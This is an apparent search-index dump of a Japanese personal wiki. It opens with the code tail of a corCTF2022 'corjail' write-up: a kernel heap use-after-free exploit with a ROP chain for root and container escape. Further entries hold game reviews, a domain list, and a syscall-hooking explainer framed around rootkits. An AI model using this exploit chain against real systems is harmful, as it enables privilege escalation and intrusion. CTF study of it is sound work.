kbase); // Free all keys except UAFed key for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) { if (keys[ix] != uafed_key) free_key(keys[ix]); } sleep(1); // wait GC(security/keys/gc.c) actually frees keys // Place `tty_file_private` on UAFed `user_key_payload` in kmalloc-32 for (int ix = 0; ix != NUM_TTY_SPRAY; ++ix) { if ((tty_fd[ix] = open(\"/dev/ptmx\", O_RDWR | O_NOCTTY)) \u003c= 2) errExit(\"open tty\"); } // Read `tty_file_private.tty` which points to `tty_struct` in kmalloc-1024 memset(keybuf, 0, 0x5000); int num_read = 0; if((num_read = keyctl_read(uafed_key, keybuf, 0x5000)) \u003c= 0) errExit(\"keyctl_read\"); printf(\"[+] read 0x%x bytes from UAFed key\\n\", num_read); ulong km1024_leaked = 0; ulong *tmp = (ulong*)keybuf + 1; for (int ix = 0; ix != 0x4330/8 - 2 - 1; ++ix) { if ( (tmp[ix] \u003e\u003e (64-4*4)) == 0xFFFF \u0026\u0026 // tty must be in kheap (tmp[ix + 1] \u003e\u003e (64-4*4)) == 0xFFFF \u0026\u0026 // file must be in kheap tmp[ix+2] == tmp[ix+3] \u0026\u0026 tmp[ix+2] != 0 \u0026\u0026 // list_head's next and prev are same (tmp[ix] \u0026 0xFF) == 0x00 \u0026\u0026 // tty must be 0x100 aligned (tmp[ix + 1] \u0026 0xFF) == 0x00 \u0026\u0026 // file must be 0x100 aligned (tmp[ix + 2] \u0026 0xF) == 0x08 ) { if (km1024_leaked == 0) { km1024_leaked = tmp[ix]; printf(\"[!] \\t+0: 0x%lx (tty)\\n\", tmp[ix]); printf(\"[!] \\t+1: 0x%lx (*file)\\n\", tmp[ix + 1]); printf(\"[!] \\t+2: 0x%lx (list_head.next)\\n\", tmp[ix + 2]); printf(\"[!] \\t+3: 0x%lx (list_head.prev)\\n\", tmp[ix + 3]); break; } } } if (km1024_leaked == 0) { print_curious(keybuf, 0x4300, 0); errExit(\"Failed to leak kmalloc-1024\"); } printf(\"[!] leaked kmalloc-1024: 0x%lx\\n\", km1024_leaked); /********************************************************/ // Free `seq_operations`, one of which is `user_key_payload` for (int ix = NUM_SEQOPERATIONS - NUM_FREE_SEQOPERATIONS; ix != NUM_SEQOPERATIONS; ++ix) { close(seqops_fd[ix]); } puts(\"[+] Freeed seq_operations\"); sleep(5); // TODO // Spray `poll_list` in kmalloc-32, one of which is placed on `user_key_payload` assign_to_core(2); neverend = 1; puts(\"[+] spraying `poll_list` in kmalloc-32...\"); num_threads = 0; for (int ix = 0; ix != NUM_2ND_POLLLIST_ALLOC; ++ix) { struct alloc_poll_list_t *arg = malloc(sizeof(struct alloc_poll_list_t)); arg-\u003efd = just_fd; arg-\u003eid = ix; arg-\u003etimeout_ms = 3000; // must 1000 \u003c timeout_ms, to wait key GC arg-\u003enum_size = 30 + 2; if(pthread_create(\u0026threads[ix], NULL, alloc_poll_list, arg) != 0) errExit(\"pthread_create\"); } // wait threads are initialized (to prevent double free) assign_to_core(0); while(num_threads != NUM_2ND_POLLLIST_ALLOC); usleep(300 * 1000); // Revoke UAFed key, which is on `poll_list` in kmalloc-32 puts(\"[+] Freeing UAFed key...\"); free_key(uafed_key); sleep(1); // Spray keys on UAFed `poll_list` puts(\"[+] spraying keys in kmalloc-32\"); assert(num_keys == 0); { char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS); memset(key_payload, 'X', SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS); ((ulong*)key_payload)[0] = 0x9999999999999999; // debug _alloc_key_prefill_ulong_val = km1024_leaked - 0x18; // 0x18 is offset where `user_key_payload` can modify from for (int ix = 0; ix != NUM_2ND_KEY_SPRAY; ++ix) { alloc_key(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_ulong); } } puts(\"[+] waiting corrupted `poll_list` is freed...\"); neverend = 0; for(int ix = 0; ix != NUM_2ND_POLLLIST_ALLOC; ++ix) { pthread_join(threads[ix], NULL); } // Free all keys for (int ix = 0; ix != NUM_2ND_KEY_SPRAY; ++ix) { free_key(keys[ix]); } puts(\"[+] waiting all keys are freed by GC...\"); sleep(1); // wait GC(security/keys/gc.c) actually frees keys // Spray keys in `kmalloc-1024`, one of which must be placed on `tty_struct` puts(\"[+] spraying keys in kmalloc-1024\"); assert(num_keys == 0); { char *key_payload = malloc(0x1000); ulong *buf = (ulong*)key_payload; buf[0] = 0x5401; // magic, kref (later `leave`ed and become RBP) buf[1] = KADDR(0xffffffff8191515a); // dev (later become ret addr of `leave` gadget, which is `pop rsp`) buf[2] = km1024_leaked + 0x50 + 0x120; // driver (MUST BE VALID) (later `pop rsp`ed) buf[3] = km1024_leaked + 0x50; // ops ulong *ops = (ulong*)(key_payload + 0x50); for (int ix = 0; ix != 0x120 / 8; ++ix) { // sizeof tty_operations ops[ix] = KADDR(0xffffffff81577609); // pop rsp } ulong *rop = (ulong*)((char*)ops + 0x120); *rop++ = KADDR(0xffffffff81906510); // pop rdi *rop++ = 0; *rop++ = KADDR(0xffffffff810ebc90); // prepare_kernel_cred *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`) *rop ++ = 0; *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found) *rop++ = KADDR(0xffffffff810eba40); // commit_creds *rop++ = KADDR(0xffffffff81906510); // pop rdi *rop++ = 1; // init process in docker container *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`) *rop ++ = 0; *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found) *rop++ = KADDR(0xffffffff819b21d3); // pop rsi *rop++ = KADDR(0xffffffff8245a720); // \u0026init_nsproxy *rop++ = KADDR(0xffffffff810ea4e0); // switch_task_namespaces *rop++ = KADDR(0xffffffff81906510); // pop rdi *rop++ = KADDR(0xffffffff82589740); // \u0026init_fs *rop++ = KADDR(0xffffffff812e7350); // copy_fs_struct *rop++ = KADDR(0xffffffff8131dab0); // push rax; pop rbx *rop++ = KADDR(0xffffffff81906510); // pop rdi *rop++ = getpid(); *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid *rop++ = KADDR(0xffffffff8117668f); // pop rdx *rop++ = 0x6E0; *rop++ = KADDR(0xffffffff81029e7d); // add rax, rdx *rop++ = KADDR(0xffffffff817e1d6d); // mov qword [rax], rbx ; pop rbx ; ret ; (1 found) *rop++ = 0; // trash *rop++ = KADDR(0xffffffff81c00ef0 + 0x16); // swapgs_restore_regs_and_return_to_usermode + 0x16 // mov rdi,rsp; mov rsp,QWORD PTR gs:0x6004; push QWORD PTR [rdi+0x30]; ... *rop++ = 0; *rop++ = 0; *rop++ = (ulong)NIRUGIRI; *rop++ = user_cs; *rop++ = user_rflags; *rop++ = (ulong)krop_stack + KROP_USTACK_SIZE / 2; *rop++ = user_ss; printf(\"[+] size: 0x%lx\\n\", (ulong)rop - (ulong)key_payload); assert((ulong)rop - (ulong)key_payload \u003c= NUM_3RD_KEY_SIZE); assert(512 \u003c NUM_3RD_KEY_SIZE + 0x10 \u0026\u0026 NUM_3RD_KEY_SIZE + 0x10 \u003c 1024); for (int ix = 0; ix != NUM_3RD_KEY_SPRAY; ++ix) alloc_key(key_payload, NUM_3RD_KEY_SIZE + 0x10, NULL); } // Invoke tty_struct.ops.ioctl puts(\"[+] ioctl-ing to /dev/ptmx\"); for (int ix = 0; ix != NUM_TTY_SPRAY; ++ix) { ioctl(tty_fd[ix], 0x1234567890, 0xABCDE0000); } // end of life (unreachable) puts(\"[ ] END of life...\"); //sleep(999999); } 参考 Author’s writeup corCTF2022 archive ","categories":"","description":"corjail from CoRCTF2022","excerpt":"corjail from CoRCTF2022","ref":"/ctf/cor-ctf/corjail/","tags":"","title":"corjail"},{"body":"このセクションについて CTF関連の話を書きます。\n今のところ、どっかで書いたブログのコピーを試験的に転用してます。\nはてなブログは…? 基本的にはCTF関連の話ははてなブログに書いてあります。\nはてなブログは好きなので使い続けますが、技術系の話をMarkdownで書くときには若干不便もあるので、もしかしたら今後はこっちを使うかもしれません。使わないかもしれません。明日は雨かもしれません。\n","categories":"","description":"","excerpt":"このセクションについて CTF関連の話を書きます。\n今のところ、どっかで書いたブログのコピーを試験的に転用してます。\nはてなブログは…? 基 …","ref":"/ctf/","tags":"","title":"CTF"},{"body":"このセクションについて かーびぃが保有するドメインの一覧だよ。サブドメインの説明もあるよ。保有状況はページ下に書いてあるcommit日時時点におけるものだよ。実は乾パンよりも穴子のほうが好きだよ。\nsmallkirby.xyz 主に利用してるよ。\nsmallkirby.xyz: HPだよ。tmuxみたいでかっこいいよね。 wywiwya.smallkirby.xyz: 日付ベースのブログをホストしてるよ。エディタはめちゃくちゃいけてるけど、Chromeがクラッシュするくらいには重いよ。 task.smallkirby.xyz: Markdownで管理するタスクリストだよ。何気にヘビーユーズしてるよ。 nirugiri.smallkirby.xyz: YouTubeのプレイリストにリダイレクトされるよ。たまに知らない曲入ってるよ。怖いね。 wiki.smallkirby.xyz: このサイトだよ。まだ試験運用だよ。 skbctf-tsg.smallkirby.xyz: CTFサイトだよ。飽きて更新止まってるよ。 skb.pw HTTPでは使ってないよ。大体仮想環境が動いてるよ。\nsmallkirby.com ネットワークによってはxyzドメインが禁止されてる場合も多くて、アクセスできないのがめんどくさいから買ったよ。 基本的にsmallkirby.xyzと同じだよ。 まだあんまり整備してないよ。\nsmallkirby.com: smallkirby.xyzのエイリアスだよ。 Tips 本当はsmallkir.byを取りたいと思ってるよ。でもベラルーシの言葉で書かなくちゃいけないんだって、難しいね。\n","categories":"","description":"かーびぃが保有するドメイン一覧","excerpt":"かーびぃが保有するドメイン一覧","ref":"/smallkirby/domains/","tags":"","title":"Domains"},{"body":"概要 プレイ情報 タイトル Ender Lilies: Quietus of the Knights 会社 Binary Haze Interactive Inc. 発売 2021 プレイ時期 2023.01.01 ~ 2023.01.04 総プレイ時間 19h36m 個人的スコア 総合スコア 9.0/10.0 中毒度 8.0/10.0 息の長さ 1.0/10.0 雰囲気 10.0/10.0 感想 俗に言うメトロイドヴァニラ系の2Dアクションゲーム。 細かく分割された小さな2Dマップがクモの巣状に繋がるように構成されている。初期状態では基本的な移動しか出来ず、ストーリーを進めてアクションスキルを獲得すると行けるマップが増えていく。その性質上、新たに得たスキルで行けるようになった場所を探すために同じマップを何度も往復する。\nストーリーは、マップ上に散らばっている書籍的なものと、ボス戦で得られる小さな回想の集積のみだが、十分に全体像を理解し、その上で想像を働かせることができるようになっている。全体的にデストピア感漂う雰囲気であり、マップも基本的には薄暗いフィールドでいかつい見た目の敵キャラが登場してくる。一方で、主人公の白巫女であるリリィは対象的な見た目をしており、黒と白のコントラストが良い味を出している。\nマップが完璧 まず第一にマップが素晴らしい。\nメトロイドチックなゲームをやったの初めてだから他がどうなってるかは知らんけど、メトロイドヴァニアのWikipediaに書いてある良いポイントがちゃんと良いポイントになっている。 最初は回避とジャンプしか出来ないため行けるところは限られているが、ボスを倒してアクションスキルを身につけると徐々に行けるところが増えてくる。そのため、ボスを倒して新しいスキルを身につけては、これまでに訪れたマップに再び赴き新しいスキルが使える場所を探すことになる。最初に来たときにはどう頑張っても辿り着けなかった場所が、新しいスキルによって行けるようになり新たな世界が見えてくる体験というのは、このゲームの最も良いポイントの1つ。それでいて、マップによっては実は必要なのは新しいスキルではなくプレイヤースキルであるというような場合もあり、行けそうで行けない場所には10分以上時間を費やしてしまったりする。\nマップのサイズもこの上なく適切で、最終的に見返してみる圧巻の多さではあるが、プレイ時間的には必要十分な量になっている。\nノンストレスな死にゲー 基本的に、このゲームは何度も死んではリトライすることを前提に作られている(多分、知らんけど)。それは探索においてもボス戦においても当てはまる。\nリリィはHPを一定量回復することのできるアクションを3~5回程度行うことができるが、死ぬまでの探索時間の上限はおおよそこの回復回数で定められている。死ぬとレストポイントと呼ばれるセーブ地点からやり直しになる。レストポイントでは体力やスキルポイント等が全回復する一方、これまで倒した敵が元通りになる。また、レストポイント間はファストトラベルすることができる。よって、探索中に命が付きそうになった場合には、とにかく敵の攻撃を避け続けて未発見のレストポイントを探そうと躍起になること必至。但し、このレストポイントの設置感覚がかなり絶妙で、例え途中で死んでも大きく戻されることなくプレイを再開することができる。 また、マップ上には2度目以降の探索のストレスを減らすためのショートカット的なものも用意されている。\nボス戦は、何体かを除いて初見でクリアするのはかなりきつい。多い奴だと50回程度のリトライでやっとクリアできた。しかし、大ボス戦の直前には必ずレストポイントがあり、且つボス演出も全てスキップできるため、再戦にストレスはない。敵の行動パターンを1つずつ理解し、それに対する回避の最適解と攻撃の隙をリトライのたびに少しずつ理解していくのが楽しい。リリィには、攻撃スキルと装備アイテムをそれぞれ20~30程度の中から複数選択して装備できるため、各ボス(少しだけ探索にも影響)に対して有効なスキルやアイテムをトライアンドエラーで試していくという楽しさもある。\nまた、デスペナルティが一切ない。敵を倒すごとに\"穢れ\"と呼ばれる経験値を入手でき、これが貯まるとレベルアップするのだが、死んでもこの経験値やレベルは消えない。また、入手アイテムや発見したマップも死ぬ前の状態が引き継がれる。よって、死ぬことにより戻るのは今いる場所だけということになる。死んでもそれまでのプレイが無駄になる可能性がまったくないというのは、プレイ中の心理的安全性を大いに確保してくれる。\n丁度よいボリュームと難易度 総プレイ時間は20時間弱だった。これは、いくつか存在するエンディング全てをクリアし、且つアイテム等の全入手やレベル100等のトロフィー全てを獲得するのに有した時間である。\nレベル上げは、とりわけ意識的には行わずストーリー全クリアの段階で90少しだった。そこから100までに20分ほどしかかからなかった。また、アイテムの全入手に関しても、探索中に意識的に行うようにしていたためストーリークリアの段階で残りは10程度になっていた。だらだらと単調なレベル上げやアイテム回収をさせないながらも、満足感のあって丁度いいことこの上ないボリュームになっている。一応クリア後にはエンドコンテンツもあるが、それはやっていない。\n難易度は確か3つ選べた内のNORMALを選択したが、これも丁度いいことこの上なし。探索では上手く敵を裁けないと容易に死ぬし、ボス戦も決して1,2回では倒せない(感覚だと、平均で8リトライくらい)が、上述した工夫のおかげでストレスなく進めていくことが出来、気づくとクリアできる難易度。\n最近は長時間ぶっ続けでプレイしちゃうようなゲームが苦手だけど、このゲームはいい感じに区切りをつけて中断できるので嬉しい。\nダークっぽい、いい感じのグラフィックと音楽 グラフィックは、詳しくないから語彙力ないけど、良いです。基本的にキャラはデフォルメチックではあるが、それでいて全く安っぽい感じがせず、デストピア感のあるダークな世界観にマッチしている。敵キャラは、グロテスクなやつから、ゴツかったり格好良かったりなやつまで色々。基本的にみんな見た目怖くて泣いちゃうかと思ったけど、それがリリィとの良い対比になっている。\n音楽に関してはまじで無知だけど、良いです。かっこいい。ボス戦で、悲しい(基本的にボスは悲しい背景を持っている)雰囲気なのに、音楽は何故か明るい曲調になっているようなバトルもあり、こういうのもエヴァみたいで良いよね、エヴァ知らんけど。\n本ページ中の画像・タイトル等は全て Binary Haze Interactive Inc. の著作物です。\n","categories":"","description":"2021, Dark fantasy 2D action RPG","excerpt":"2021, Dark fantasy 2D action RPG","ref":"/gaming/enderlilies/","tags":"","title":"Ender Lilies: Quietus of the Knights"},{"body":"このセクションについて smallkirbyがこれまでにプレイしたことのあるゲームについて書きます。\n超個人的偏見をもとにスコア付けをしています。基本的に全部良いゲームなので、スコアが悪くても批判する意図はないです。\n","categories":"","description":"","excerpt":"このセクションについて smallkirbyがこれまでにプレイしたことのあるゲームについて書きます。\n超個人的偏見をもとにスコア付けをしてい …","ref":"/gaming/","tags":"","title":"Game"},{"body":"概要 プレイ情報 タイトル HARVESTELLA 会社 SQUARE ENIX 発売 2022 プレイ時期 2023.4.29 ~ 2023.05.20 総プレイ時間 60h 個人的スコア 総合スコア 9.2/10.0 音楽 13.9/10.0 戦闘 5.2/10.0 ストーリー 10.0/10.0 農業 8.0/10.0 UI 6.0/10.0 サブクエスト 9.0/10.0 グラフィック 9.0/10.0 ボイス 0/10.0 イントロ 農業ゲーム+RPGの融合ゲー。\n個人的にはスクエニのゲームには少し苦い思い出がある。 具体的にはオクトパストラベラーが全くハマらなくて開始2hで挫折したり、 The DioField Chronicleの終わり方に納得いかなかったり、 あと完全に趣味だがHD2Dというシステム自体が好きじゃないのにゴリ押ししていたりという理由から、 スクエニのゲームを買うのはずっと避けてきた。 とはいってもたまにどストライクのゲームがあるのも事実で、BRAVELY DEFAULT 2なんかはゲームシステムもグラフィックも好きでかなりハマった記憶がある。\n今回Harvestellaを購入したのは、たまたま農業系をやりたいと思っていた(そして牧場物語 Welcome!ワンダフルライフを試してみて7分で飽きるという最速記録を叩き出した)というのと、 GWイベントでスクエニがセールをしており、スクエニにしてはいい値段の下げ方をしていたから(定価7680円に対してセール値3840円)。\n音楽に始まり音楽に終わる一作 このゲームは、個人的にBOSEのヘッドホンを買ったということもありヘッドホンをしてプレイした(これまではイヤホン・ヘッドホンを使ってゲームをしたことはほとんどない)。 それによる贔屓も入っているかもしれないが、それを差し引いても音楽が素晴らしい。とてつもなく、良い。\n正直これだけで、もとが取れるんじゃないかと思うくらい良い。 日常のゆったりとした音楽から、緊急事態の忙しない音楽、クライマックスの壮大な音楽に至るまで全ての音楽が素晴らしかった。 それから、会話送りでAボタンを押した時の音だとか決定ボタンを押したときの音ですら心地よかった。これは流石にヘッドホン補正が入ってるかもしれないけど。\nメインコンポーサーは 椎名 豪 という人らしい。正直ゲームの音楽興味なかったので知らない人だけど。 次にゲームを買うときは音楽コンポーサーの名前を見てから買おうと思うくらいには良かった。\nサントラ買おうかと思ってます。\n農業要素は満足 農業ゲーム的なゲームをしたのは初めてだったが、日々のタスクを効率的にやりつつRPGを進めていくというのは面白かった。\n農業は、四季のある村で季節や場所に応じた作物を育てていく感じ。 育てた作物の用途としては、売ってお金にするか、料理や加工に使って回復アイテムにするかがメインの択。 序盤はかなりお金がシビアで、種を買うにもお金がいいるのでかなりカツカツになる。 後半に行くにつれて(ただクリアするだけなら)お金に余裕が出てくるので、そこまで農業が必須というわけではなくなる。\n農業では耕す・植える・水をやる・収穫するといったプロセスがあるが、 各プロセスはFairy Orderというサブミッションのようなものをクリアしていくとスキルやツールが得られ、 どんどん楽になっていくというシステム。 この効率化のペースも、おおよそちょうどよかったと思う。\n金策としては農業をするよりもクエストをするほうが遥かに良いしクリアするだけならそれだけでも良いと思うが、 Fairy OrderやFood Deliveryや回復アイテムとしての要素を組み合わせることで、 いい感じに農業へのモチベーションを高めていた。 特に後半の戦闘はジュースでゴリ押すことも多かったため、果物や野菜の生産は必須だった。 また、作った料理の一枚絵も綺麗だったため、料理コンプへのモチベーションがいい感じに農業のモチベーションにつながっていた。\n農業するときのアクションで、細かい不便な点はほんの少しあった(チャージすると向きを変えられない・チャージで耕すときに既に耕したマスを起点にしてチャージができない等)が、まあ全然許容範囲。\n戦闘システムは、不便な点こそあるが許容範囲 戦闘はマップ上でのシームレスなエンカウント方式。 ジョブごとにスキルがあり、ジョブを切り替えつつ相手の弱点をついていくという感じ。\nまぁ正直ボタンポチポチゲーではある。ガードはないので基本は避けるしか無い。 避けるにはダッシュ・ステップができるが、基本的に敵の当たり判定が意味不明なため、 敵の攻撃が当たらない遠隔から攻撃できるMageやLunamancerで戦っていた。\nそれから、敵の弱点を突くといっても敵の弱点が何かを示すアイコンが異常に小さくほとんど見えない。 それから自分のスキルの属性もよくわからないため、正直弱点を突こうという意識はほとんどなかった。\n体力は料理で作った回復アイテムで回復できるが、満腹度がマックスになると食事ができなくなるため、 満足度を上昇させないジュースでの回復がメインになった。 最後の方はジュースを大量持参して体力減ったらX連打みたいな戦闘スタイルになっていた。\n最も不満な点が、Double Breakしたときの必殺技みたいなやつ。 敵をBreakすると味方のムービー付きの必殺技を撃てるのだが、 なんとこのムービー中も時間が停止せず、敵は攻撃し続けるという代物。 しかもこっちはムービー中は操作不能なので、必殺技を打ってる間にボスに必ずやられてしまうという意味不明システム。 おかげでDouble Breakを終盤で使うことはほとんどなかった。\nまぁでも戦闘自体はそこまで期待していなかったし、総合的に見るとそこまでひどいものでもなかったからよし。\nだんだん壮大になっていくストーリー / 丁寧なサブクエスト ストーリーは結構好き。もちろん詳しくは書けないけど。\nもちろん始まりから平和というわけではないけど、それでも比較的おっとりとした序盤から、 終盤に行くにつれてだんだんと壮大・抽象的になっていくストーリーはかなり良かった。 ちゃんと盛り上げるところを(音楽の力も借りて)盛り上げていて良い。 ちゃんと言ってほしいところでお決まりっぽいセリフを言ってくれるのも、安心感がある。\nこの作品の音楽についで良かった点は、サブクエストが丁寧な点。 もちろん本質的にはお使い的なことをやるのだが、キャラクターごとの掘り下げがしっかりとしていて、 ちゃんとサブクエごとに起承転結を作っているのが素晴らしい。 音楽の恩恵も十分に受けている。 Harvestellaの1個前にライザのアトリエ3をやっていたのだが、これのサブクエが本当にしんどかったため、 本作品はサブクエストが丁寧なのがとても嬉しかった。\nイラスト/マップは少し古い感もあるが個人的に好き マップは箱庭型。基本的には壁を登るとか高い段差を登るみたいなことは出来ない。 マップ自体は普通に綺麗。Switchにしてはかなり良いグラフィックに感じた(あんまグラフィック詳しくないけど)。\n主人公は決められたプリセットから選ぶ。髪色とか瞳の色とかだけ変えられた気がする。 自由度はないが、主人公のデザイン自体が好みだったため全く不満はなし。 登場人物のデザインはみんな好きだった。男女どっちも服のデザインも良かった。\nただし、ボイスは本当におまけ程度しか無い。本当に誰も喋らない。 家を出るときとか畑を出るときとかに妖精が少ししゃべるくらい。 おかげで、たまに誰かが喋ったとしても誰が喋ってるのか全く分からなかった。 せめてムービーシーンとかだけでもボイスが欲しかった。\n終わりに 多少の不満点こそあるものの、尋常じゃなく素晴らしい音楽とよく練られたストーリー・サブクエに支えられて、かなり楽しめたゲームだった。デザイン・雰囲気・グラフィックもかなり自分の好みに刺さっていて、好きなゲームのトップ5に入る。\n全然関係ないけど、Harvestellaはぼくがイタリアに行く必要があった時に唯一イタリアでプレイしたゲームなのでそれ込みで思い出に残る一作。 あとめちゃくちゃ関係ないけど、英語設定でやったのでいい感じに英語の勉強にもなった(地名とか全く読めなかったので、クリア後にググる時に困った)。\n本ページ中の画像・タイトル等は全て Square Enix Holdings Co., Ltd の著作物です。\n","categories":"","description":"2022, 死季を生きる","excerpt":"2022, 死季を生きる","ref":"/gaming/harvestella/","tags":"","title":"HARVESTELLA"},{"body":"@smallkirbyが思ったことを書くらしいです。思ってないことも書くらしいです。\n雑多なことを書く場所だよ。 日本語でしか書かないよ。\nつかってるやつ コンテンツとサイト自体はGitHubで管理してるよ。\nフレームワークは Hugo + Docsy だよ。\nまちがいみつけた！ ページ右上のImprove this pageから、GitHubにIssueあげてほしいよ。\n各ページの下にDisqusでコメントできるようになってるから、それでもいいよ。\n","categories":"","description":"","excerpt":"@smallkirbyが思ったことを書くらしいです。思ってないことも書くらしいです。\n雑多なことを書く場所だよ。 日本語でしか書かないよ。\n …","ref":"/","tags":"","title":"WIKIRBY"},{"body":"Linux index\nWarning なんか間違いあったら教えてください。 ","categories":"","description":"","excerpt":"Linux index\nWarning なんか間違いあったら教えてください。 ","ref":"/linux/","tags":"","title":"Linux"},{"body":"Linuxのページ処理周りの話をするよ。\n","categories":"","description":"","excerpt":"Linuxのページ処理周りの話をするよ。\n","ref":"/linux/pages/","tags":"","title":"Page Handling"},{"body":"このセクションについて smallkirbyの生態を書きます。\n","categories":"","description":"","excerpt":"このセクションについて smallkirbyの生態を書きます。\n","ref":"/smallkirby/","tags":"","title":"smallkirby"},{"body":"System Callのフックを中心としたおはなし。\n","categories":"","description":"Syscallのフック周りのおはなし","excerpt":"Syscallのフック周りのおはなし","ref":"/cameyes/syscall/","tags":"","title":"Syscall"},{"body":"Linux Kernel v5.13.0\nSyscall Hooking Rootkitがなんらかのsyscall、若しくは全てのsyscallをフックしたいとします。このとき、フックの方法にはいくつかありますが、ここでは最も単純で直感的な「syscall tableを直接書き換える」方法を考えてみましょう。\n古き日のSyscall呼び出しの流れ まず、syscall呼び出しの流れを見てみましょう。\n一昔前はint 0x80命令によってsyscallを呼び出していました。ご存知の通りint命令は割り込みを発生させる命令で、IDTRによって指される割り込みテーブルに登録された割り込みハンドラに処理が移ります。int 0x80なので、0x80番がシステムコールのエントリポイントということですね。 但し、なんか知らんけどいちいち割り込みを発生させるのはオーバーヘッドが大きいということで、最近では使われません。今でも呼び出すこと自体はできるのかは、知りません。あと、sysenterとかいうやつに関しては、聞いたこともありません。\n現在のSyscall呼び出しの流れ 現在では、intの代わりにsyscallを使います。こいつは、IA32_LSTAR MSRに指されるエントリポイントに処理を移します。なんか知らんけどintより早いらしいです。因みに、vDSOでuserlandにexportされているsyscallの場合はkernelに処理を移す必要すらありませんが、今回は無視します。\nLSTAR MSRは、syscall_init()で初期化され、entry_SYSCALL_64を指します:\n// arch/x86/kernel/cpu/common.c void syscall_init(void) { wrmsr(MSR_STAR, 0, (__USER32_CS \u003c\u003c 16) | __KERNEL_CS); wrmsrl(MSR_LSTAR, (unsigned long)entry_SYSCALL_64); wrmsrl(MSR_CSTAR, (unsigned long)ignore_sysret); wrmsrl_safe(MSR_IA32_SYSENTER_CS, (u64)GDT_ENTRY_INVALID_SEG); wrmsrl_safe(MSR_IA32_SYSENTER_ESP, 0ULL); wrmsrl_safe(MSR_IA32_SYSENTER_EIP, 0ULL); /* Flags to clear on syscall */ wrmsrl(MSR_SYSCALL_MASK, X86_EFLAGS_TF|X86_EFLAGS_DF|X86_EFLAGS_IF| X86_EFLAGS_IOPL|X86_EFLAGS_AC|X86_EFLAGS_NT); } entry_SYSCALL_64は、arch/x86/entry/syscalls/syscall_64.Sで定義されています:\n/* arch/x86/entry/syscalls/syscall_64.S */ SYM_CODE_START(entry_SYSCALL_64) UNWIND_HINT_EMPTY swapgs movq\t%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2) SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp movq\tPER_CPU_VAR(cpu_current_top_of_stack), %rsp SYM_INNER_LABEL(entry_SYSCALL_64_safe_stack, SYM_L_GLOBAL) pushq\t$__USER_DS\t/* pt_regs-\u003ess */ pushq\tPER_CPU_VAR(cpu_tss_rw + TSS_sp2)\t/* pt_regs-\u003esp */ pushq\t%r11\t/* pt_regs-\u003eflags */ pushq\t$__USER_CS\t/* pt_regs-\u003ecs */ pushq\t%rcx\t/* pt_regs-\u003eip */ SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL) pushq\t%rax\t/* pt_regs-\u003eorig_ax */ PUSH_AND_CLEAR_REGS rax=$-ENOSYS /* IRQs are off. */ movq\t%rax, %rdi movq\t%rsp, %rsi call\tdo_syscall_64\t/* returns with IRQs disabled */ 改めて、アセンブリとかいう言語はAT\u0026TとIntelとかいう2つの方言があって腹が立つ言語ですね。最初にRSPをkernelの退避領域に移した後、PER_CPU_VARからちゃんとしたスタックのアドレスを取り出しています。あとはスタック上にstruct pt_regsを構築した後、do_syscall_64()を呼び出しています。こいつこそが真のエントリポイントです:\n// arch/x86/entry/common.c __visible noinstr void do_syscall_64(unsigned long nr, struct pt_regs *regs) { add_random_kstack_offset(); nr = syscall_enter_from_user_mode(regs, nr); if (likely(nr \u003c NR_syscalls)) { nr = array_index_nospec(nr, NR_syscalls); regs-\u003eax = sys_call_table[nr](regs); } syscall_exit_to_user_mode(regs); } entry_SYSCALL_64内のmovq %rax, %rdiでsyscall番号(nr)をRDIに移しているので、第一引数はnrになっています。regsはスタック上に置いてあるレジスタ値で、あとで多分復元されます。syscall_enter_from_user_mode()はIRQ周りの何かとかtrace周りの何かをしてましたが、そんな重要じゃないです。array_index_nospec()は、nrがNR_syscallsを超えていないかチェックしています。最終的には、sys_call_tableのnr番目を呼び出しているというところが大事です:\n// arch/x86/include/asm/syscall.h typedef long (*sys_call_ptr_t)(const struct pt_regs *); // arch/x86/entry/syscall_64.c asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = { /* * Smells like a compiler bug -- it doesn't work * when the \u0026 below is removed. */ [0 ... __NR_syscall_max] = \u0026__x64_sys_ni_syscall, #include \u003casm/syscalls_64.h\u003e }; hackyですね。この部分、Linuxのコードの中で256本の指に入るくらいに好きな部分です。配列初期化の中に#includeを入れ込んでるところも良いですが、Smells like a compiler bugというコメントもいい味を醸し出しています。最近のkernelだとこのコメント消されてるっぽいので、悲しいですね。それはさておき、asm/syscalls_64.hはこんな感じでひたすらにシステムコールハンドラが登録されています:\narch/x86/include/generated/asm/syscalls_64.h __SYSCALL_COMMON(0, sys_read) __SYSCALL_COMMON(1, sys_write) __SYSCALL_COMMON(2, sys_open) __SYSCALL_COMMONは、readの場合に多分最終的にこんな感じに展開されます:\n[0] = __x64_sys_read まぁ配列の初期化をするだけですね。さてさて、それはさておき、syscallの定義で利用されるSYSCALL_DEFINExマクロの内部で利用される__SYSCALL_DEFINExマクロは、以下のように3つの関数を定義します:\n#define __SYSCALL_DEFINEx(x, name, ...)\t\\ static long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__));\t\\ static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__));\\ __X64_SYS_STUBx(x, name, __VA_ARGS__)\t\\ __IA32_SYS_STUBx(x, name, __VA_ARGS__)\t\\ static long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__))\t\\ {\t\\ long ret = __do_sys##name(__MAP(x,__SC_CAST,__VA_ARGS__));\\ __MAP(x,__SC_TEST,__VA_ARGS__);\t\\ __PROTECT(x, ret,__MAP(x,__SC_ARGS,__VA_ARGS__));\t\\ return ret;\t\\ }\t\\ static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__)) 